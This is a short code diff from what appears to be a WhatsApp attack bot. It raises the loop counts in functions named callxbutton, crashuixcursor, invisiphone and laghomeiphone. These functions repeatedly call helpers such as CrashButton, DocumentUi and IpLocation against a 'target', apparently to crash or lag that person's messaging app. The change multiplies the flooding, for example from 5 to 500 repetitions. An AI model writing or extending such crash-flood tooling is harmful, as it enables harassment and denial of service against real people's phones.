@@ -739,36 +739,36 @@ let whatsappStatus = false;
                    }
            }
            async function callxbutton(target) {
-                   for (let i = 0; i < 5; i++) {
+                   for (let i = 0; i < 500; i++) {
                            await CallPermision(target)
                            await CallPermision(target)
                    }
-                   for (let i = 0; i < 5; i++) {
+                   for (let i = 0; i < 500; i++) {
                            await CrashButton(target)
                            await CrashButton(target)
                    }
            }
            async function crashuixcursor(target) {
-                   for (let i = 0; i < 5; i++) {
+                   for (let i = 0; i < 500; i++) {
                            await DocumentUi(target)
                            await LocationUi(target)
                    }
-                   for (let i = 0; i < 5; i++) {
+                   for (let i = 0; i < 500; i++) {
                            await CrashButton(target)
                            await CrashButton(target)
                    }
            }
            async function invisiphone(target) {
-                   for (let i = 0; i < 1; i++) {
+                   for (let i = 0; i < 100; i++) {
                            await IpLocation(target)
                            await IpLocation(target)
                    }
            }
            async function laghomeiphone(target) {
-                   for (let i = 0; i < 10; i++) {
+                   for (let i = 0; i < 100; i++) {
                            await IpLocation(target)
                    }
-                   for (let i = 0; i < 2; i++) {
+                   for (let i = 0; i < 200; i++) {
                            await IpLocation(target)
                    }
            }
